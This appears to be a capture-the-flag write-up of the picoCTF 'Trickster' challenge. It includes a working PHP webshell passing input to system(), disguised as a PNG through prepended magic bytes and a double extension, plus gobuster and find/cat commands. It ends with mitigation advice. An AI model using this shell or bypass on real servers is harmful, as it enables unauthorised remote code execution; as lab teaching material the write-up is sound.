---
title: 'Trickster'
target: 'picoCTF — Trickster'
difficulty: 'medium'
date: 2026-07-22
summary: "A picoCTF Web Exploitation challenge where a PNG upload validator checked for .png in the filename and PNG magic bytes in the file header. Bypassed both by prepending literal PNG text to a PHP webshell and naming it webshell.png.php, then used the uploaded shell to locate and read the flag file."
role: 'appsec'
tags: ['web-exploitation', 'file-upload', 'webshell', 'php', 'magic-bytes', 'extension-bypass', 'directory-enumeration', 'gobuster', 'rce', 'picoctf']
problem: "A web application that processes PNG image uploads, validating both the file extension and the magic bytes in the file header. The objective is to bypass these upload restrictions to achieve remote code execution and locate the flag file."
action: "Ran gobuster to discover /robots.txt pointing to /instructions.txt, which disclosed the exact validation logic: .png extension check in the filename and PNG magic bytes (50 4E 47) in the first few bytes. Prepended literal PNG text to a PHP webshell and named it webshell.png.php to satisfy both checks. Uploaded it, accessed /uploads/webshell.png.php for RCE, then used find / -name '*.txt' to locate the flag at /var/www/html/MFRDAZLDMUYDG.txt and read it with cat."
outcome: "Retrieved the flag by bypassing PNG upload validation with prepended magic bytes and a double extension. The server only checked for partial magic bytes (3 bytes instead of the full 8-byte PNG signature) and allowed PHP execution in the uploads directory — any single proper mitigation would have prevented the attack."
draft: false
---

## Background

Trickster is a 300-point picoCTF Web Exploitation challenge about bypassing file upload restrictions. The application processes PNG images and has validation in place — it checks the file extension and the magic bytes in the file header. The challenge tags include "browser_webshell_solvable", which is a strong hint about the intended attack vector: upload a PHP webshell disguised as a PNG image, then access it through the browser to execute commands on the server.

![picoCTF challenge page for Trickster showing 300 points, Web Exploitation and browser_webshell_solvable tags, author JUNIAS BONOU, description "I found a web app that can help process images: PNG images only!", 726 users solved with 97% success rate, no hints available.](/writeups/picoctf-trickster/01.png)

---

## Enumerating the application

After launching the challenge instance, the link opened to a simple image upload page. Before interacting with the upload functionality, ran gobuster to enumerate directories and files:

```
gobuster dir -u http://atlas.picoctf.net:<port>/ -w /usr/share/dirb/wordlists/big.txt
```

The scan returned two useful results: `/robots.txt` with Status 200 and `/uploads` with Status 301 (Forbidden). The `/robots.txt` file pointed to `/instructions.txt`, which contained the developer's internal notes describing how the upload validation was supposed to work.

![Developer instructions from /instructions.txt showing the validation requirements: "Let's create a web app for PNG Images processing. It needs to: Allow users to upload PNG images — look for .png extension in the submitted files — make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: 50 4E 47) — after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing."](/writeups/picoctf-trickster/02.png)

These notes were the key to the entire challenge. The validation had two checks: the filename must contain `.png`, and the first few bytes of the file must contain the PNG magic bytes `50 4E 47` (the hex representation of the ASCII string "PNG"). The developer's own note expressed uncertainty about magic bytes — "not sure what this is exactly but wikipedia says..." — which is a strong signal that the implementation would be incomplete. A proper PNG file starts with an eight-byte signature (`89 50 4E 47 0D 0A 1A 0A`), but this application only checked for three bytes. And the extension check looked for `.png` anywhere in the filename rather than enforcing it as the sole extension.

---

## Crafting the webshell

With both validation rules known, the bypass required satisfying each check while keeping the uploaded file executable as PHP. Downloaded a simple PHP webshell — a minimal script that provides a text input and Execute button, passing the entered command to PHP's `system()` function for server-side execution.

To pass the magic byte check, prepended the literal text `PNG` as the first line of the file. The server was looking for bytes `50 4E 47` near the start of the file, and the ASCII string "PNG" produces exactly those bytes. The PHP interpreter ignores anything outside `<?php ?>` tags, so the leading PNG text would simply be echoed as harmless output before the PHP code executed. The modified file:

```php
PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```

For the extension check, named the file `webshell.png.php`. The `.png` in the filename satisfied the extension filter (which checked for the substring rather than a strict terminal extension), while the `.php` at the end ensured Apache's PHP module would process the file as a script rather than serving it as a static image. Uploaded the file through the web interface — both checks passed and the server accepted it.

---

## Gaining command execution and finding the flag

Navigated to `/uploads/webshell.png.php` and the webshell loaded — a simple text input with an Execute button, ready to run commands on the server. The `PNG` text appeared at the top of the page (the prepended magic bytes being echoed as plain text before the HTML rendered), confirming the file was being processed as PHP.

Used `find / -name "*.txt"` to search the entire filesystem for text files. The output listed standard system files across Python, PHP, and Perl directories, but one entry was clearly out of place: `/var/www/html/MFRDAZLDMUYDG.txt` — a randomly-named file sitting in the web root alongside the familiar `instructions.txt` and `robots.txt`.

![PHP webshell at /uploads/webshell.png.php showing the command find / -name "*.txt" with results listing system text files and the flag file /var/www/html/MFRDAZLDMUYDG.txt highlighted in blue among the results, with /var/www/html/instructions.txt and /var/www/html/robots.txt also visible.](/writeups/picoctf-trickster/03.png)

Executed `cat /var/www/html/MFRDAZLDMUYDG.txt` to read the flag file.

![PHP webshell showing the command cat /var/www/html/MFRDAZLDMUYDG.txt with the result displaying the flag wrapped in a CSS comment: picoCTF{c3rt!fi3d_Xp3rt...}.](/writeups/picoctf-trickster/04.png)

The flag was retrieved from the randomly-named text file in the web root.

---

## What I took from this

Trickster is a textbook file upload bypass challenge, and the developer's own instructions file spelled out every weakness. The magic byte check looked for only three bytes (`50 4E 47`) instead of the full eight-byte PNG signature (`89 50 4E 47 0D 0A 1A 0A`), meaning any file starting with the ASCII text "PNG" passed validation regardless of whether it was actually a PNG image. The extension check searched for the substring `.png` in the filename rather than requiring it as the only extension, so a double extension like `.png.php` sailed through. And the uploads directory served files with their original extensions under Apache's PHP handler, meaning any `.php` file uploaded there would execute as code rather than being served as static content. Each of these is a well-documented antipattern in file upload security: proper validation checks the complete magic byte sequence (or better, actually parses the image), enforces a strict allowlist of terminal extensions, stores files outside the webroot or strips their extensions entirely, and disables script execution in upload directories. The challenge also reinforced the value of directory enumeration as a first step — gobuster revealed `robots.txt` which led to `instructions.txt`, and having the developer's notes turned what could have been hours of trial-and-error fuzzing into a straightforward two-step bypass.
